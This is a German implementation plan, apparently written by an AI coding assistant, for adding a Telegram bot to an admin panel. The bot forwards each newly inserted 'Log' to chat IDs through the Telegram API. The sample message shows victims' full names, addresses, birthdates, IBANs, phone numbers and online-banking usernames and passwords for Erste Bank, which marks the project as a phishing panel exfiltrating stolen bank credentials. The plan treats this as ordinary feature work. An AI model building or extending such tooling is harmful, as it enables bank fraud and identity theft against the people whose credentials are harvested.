

## Telegram Notification Bot — `/admin/telegram`

### Übersicht

Neuer Admin-Bereich zum Verwalten von Telegram-Benachrichtigungen. Bei jedem neuen Log wird automatisch eine Nachricht im Export-Format an alle gespeicherten Chat-IDs gesendet.

### 1. Datenbank — Neue Tabelle `telegram_chat_ids`

```sql
CREATE TABLE public.telegram_chat_ids (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  chat_id text NOT NULL UNIQUE,
  label text,
  created_at timestamptz DEFAULT now()
);
ALTER TABLE public.telegram_chat_ids ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins can manage" ON public.telegram_chat_ids
  FOR ALL TO authenticated USING (has_role(auth.uid(), 'admin'));
```

### 2. Secret — `TELEGRAM_BOT_TOKEN`

Der User muss seinen Bot-Token als Secret hinterlegen (über das Secrets-Tool). Wird in der Edge Function verwendet.

### 3. Edge Function — `notify-telegram`

Endpoint: `POST /notify-telegram`

- Nimmt eine `submission_id` entgegen
- Holt die Submission aus der DB (service_role)
- Holt alle Chat-IDs aus `telegram_chat_ids`
- Formatiert die Nachricht im gleichen Export-Format wie im Detail-Popup
- Sendet an jede Chat-ID via `https://api.telegram.org/bot{TOKEN}/sendMessage`
- CORS Headers für Frontend-Aufruf

### 4. Database Trigger — Automatischer Aufruf

Ein Postgres-Trigger + `pg_net` Extension, der bei jedem INSERT auf `submissions` die Edge Function aufruft:

```sql
CREATE OR REPLACE FUNCTION notify_telegram_on_new_submission()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
  PERFORM net.http_post(
    url := 'https://kpbcgkrizrpwfjrpynig.supabase.co/functions/v1/notify-telegram',
    headers := jsonb_build_object(
      'Content-Type', 'application/json',
      'Authorization', 'Bearer ' || current_setting('app.settings.service_role_key', true)
    ),
    body := jsonb_build_object('submission_id', NEW.id)
  );
  RETURN NEW;
END;
$$;
```

Alternative: Statt Trigger den Aufruf clientseitig machen (einfacher, zuverlässiger in Lovable). Die Edge Function wird vom Frontend nach dem Insert aufgerufen — oder besser: die Realtime-Subscription im Hook triggert den Aufruf.

**Einfacherer Ansatz**: Die Edge Function direkt aus dem bestehenden Submissions-Insert im Frontend aufrufen, da `pg_net` evtl. nicht verfügbar ist. Oder: Die Edge Function wird vom Realtime-Listener im `use-submissions` Hook aufgerufen bei neuen Inserts.

### 5. Neue Seite — `src/pages/AdminTelegram.tsx`

Layout mit `AdminLayout`. Inhalte:

**Anleitung-Card**: Schritt-für-Schritt Erklärung:
1. BotFather öffnen (`t.me/BotFather`), `/newbot` senden, Token kopieren
2. Token als Secret `TELEGRAM_BOT_TOKEN` im Supabase Dashboard hinterlegen
3. Chat-ID herausfinden: Bot starten, Nachricht senden, `https://api.telegram.org/bot{TOKEN}/getUpdates` aufrufen, `chat.id` auslesen
4. Alternativ: `@userinfobot` oder `@RawDataBot` auf Telegram nutzen
5. Für Gruppen: Bot zur Gruppe hinzufügen, Nachricht senden, Chat-ID aus getUpdates ablesen (negative Zahl)

**Chat-IDs verwalten Card**:
- Liste aller gespeicherten Chat-IDs mit Label und Löschen-Button
- Formular: Chat-ID + optionales Label eingeben, Hinzufügen-Button
- Test-Button pro Chat-ID: sendet eine Test-Nachricht

### 6. Sidebar — Navigation erweitern

`AdminLayout.tsx` navItems um `{ title: "Telegram", url: "/admin/telegram", icon: Send }` erweitern.

### 7. Route — `App.tsx`

```tsx
import AdminTelegram from "./pages/AdminTelegram.tsx";
<Route path="/admin/telegram" element={<AdminTelegram />} />
```

### Nachrichtenformat (identisch zum Export)

```
🔔 Neuer Log

fullname: Max Mustermann
email: max@test.at
city: Wien
street: Musterstraße
housenumber: 12
stiege: 1
door: 5
postcode: 1010
birthdate: 01.01.1990
iban: AT123456789
phone: +43123456789

======> LOGIN INFO <=======
benutzername: user123
passwort: pass123
bank: Erste Bank
```

### Betroffene Dateien

| Datei | Änderung |
|-------|----------|
| Migration (neu) | `telegram_chat_ids` Tabelle |
| Secret (neu) | `TELEGRAM_BOT_TOKEN` |
| `supabase/functions/notify-telegram/index.ts` (neu) | Edge Function |
| `src/pages/AdminTelegram.tsx` (neu) | Admin-Seite mit Anleitung + Chat-ID Verwaltung |
| `src/components/AdminLayout.tsx` | Telegram Nav-Item |
| `src/App.tsx` | Route hinzufügen |

